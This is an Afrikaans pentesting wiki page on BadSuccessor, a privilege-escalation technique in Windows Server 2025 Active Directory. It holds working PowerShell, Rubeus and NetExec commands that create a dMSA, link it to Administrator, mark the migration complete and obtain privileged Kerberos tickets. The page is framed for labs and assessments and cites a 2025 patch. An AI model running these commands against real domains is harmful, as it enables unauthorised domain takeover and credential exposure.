# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

**BadSuccessor** misbruik die **delegated Managed Service Account** (**dMSA**) migrasie-werkvloei wat in **Windows Server 2025** bekendgestel is. ’n dMSA kan deur **`msDS-ManagedAccountPrecededByLink`** aan ’n ou rekening gekoppel word en deur die migrasiestatusse beweeg wat in **`msDS-DelegatedMSAState`** gestoor word. As ’n aanvaller ’n dMSA in ’n writable OU kan skep en daardie eienskappe kan beheer, kan die KDC tickets uitreik vir die aanvaller-beheerde dMSA met die **authorization context van die gekoppelde rekening**.

In die praktyk beteken dit dat ’n laag-geprivilegieerde user wat net gedelegeerde OU-regte het, ’n nuwe dMSA kan skep, dit na `Administrator` wys, die migrasiestatus voltooi, en dan ’n TGT verkry wie se PAC geprivilegieerde groups soos **Domain Admins** bevat.

## dMSA-migrasiebesonderhede wat saak maak

- dMSA is ’n **Windows Server 2025** feature.
- `Start-ADServiceAccountMigration` stel die migrasie in die **started** status.
- `Complete-ADServiceAccountMigration` stel die migrasie in die **completed** status.
- `msDS-DelegatedMSAState = 1` beteken migrasie het begin.
- `msDS-DelegatedMSAState = 2` beteken migrasie is voltooi.
- Tydens wettige migrasie is die bedoeling dat die dMSA die vervangde rekening deursigtig vervang, so die KDC/LSA behou access wat die vorige rekening reeds gehad het.

Microsoft Learn merk ook op dat tydens migrasie die oorspronklike rekening aan die dMSA gekoppel is en dat die dMSA bedoel is om toegang te verkry tot wat die ou rekening kon verkry. Dit is die security assumption wat BadSuccessor misbruik.

## Vereistes

1. ’n Domain waar **dMSA bestaan**, wat beteken **Windows Server 2025** support is teenwoordig aan die AD-kant.
2. Die aanvaller kan `msDS-DelegatedManagedServiceAccount` objects in ’n sekere OU **create**, of het ekwivalente breë child-object creation rights daar.
3. Die aanvaller kan die relevante dMSA attributes **write** of die dMSA wat hulle pas geskep het volledig beheer.
4. Die aanvaller kan Kerberos tickets aanvra vanaf ’n domain-joined konteks of vanaf ’n tunnel wat LDAP/Kerberos bereik.

### Praktiese kontroles

Die skoonste operator-sein is om die domain/forest level te verifieer en te bevestig dat die environment reeds die nuwe Server 2025 stack gebruik:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
As jy waardes soos `Windows2025Domain` en `Windows2025Forest` sien, behandel **BadSuccessor / dMSA migration abuse** as ’n prioriteitskontrole.

Jy kan ook skryfbare OUs wat vir dMSA creation gedelegeer is, met publieke tooling enumereer:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Misbruikvloei

1. Skep 'n dMSA in 'n OU waar jy gedelegeerde create-child regte het.
2. Stel **`msDS-ManagedAccountPrecededByLink`** na die DN van 'n bevoorregte teiken soos `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Stel **`msDS-DelegatedMSAState`** na `2` om die migrasie as voltooi te merk.
4. Versoek 'n TGT vir die nuwe dMSA en gebruik die teruggekeerde ticket om by bevoorregte dienste uit te kom.

PowerShell example:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Tiketaanvraag / operasionele nutsmiddel-voorbeelde:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Hoekom dit meer is as privilege escalation

Tydens legitieme migrasie moet Windows ook die nuwe dMSA laat hanteer tickets wat vir die vorige account uitgereik is voordat cutover plaasvind. Dit is hoekom dMSA-verwante ticketmateriaal **current** en **previous** keys kan insluit in die **`KERB-DMSA-KEY-PACKAGE`** flow.

Vir ’n aanvaller-beheerde valse migrasie kan daardie gedrag BadSuccessor omskep in:

- **Privilege escalation** deur geprivilegieerde group SIDs in die PAC te erf.
- **Credential material exposure** omdat previous-key handling materiaal kan blootstel wat gelykstaande is aan die voorganger se RC4/NT hash in kwesbare workflows.

Dit maak die technique nuttig vir beide direkte domain takeover en vir opvolgoperasies soos pass-the-hash of groter credential compromise.

## Notas oor patch status

Die oorspronklike BadSuccessor-gedrag is **nie net ’n teoretiese 2025 preview issue** nie. Microsoft het dit as **CVE-2025-53779** aangewys en ’n security update in **August 2025** gepubliseer. Hou hierdie attack gedokumenteer vir:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **validation of OU delegations and dMSA exposure during assessments**

Moenie aanvaar ’n Windows Server 2025 domain is kwesbaar net omdat dMSA bestaan nie; verifieer patch level en toets versigtig.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
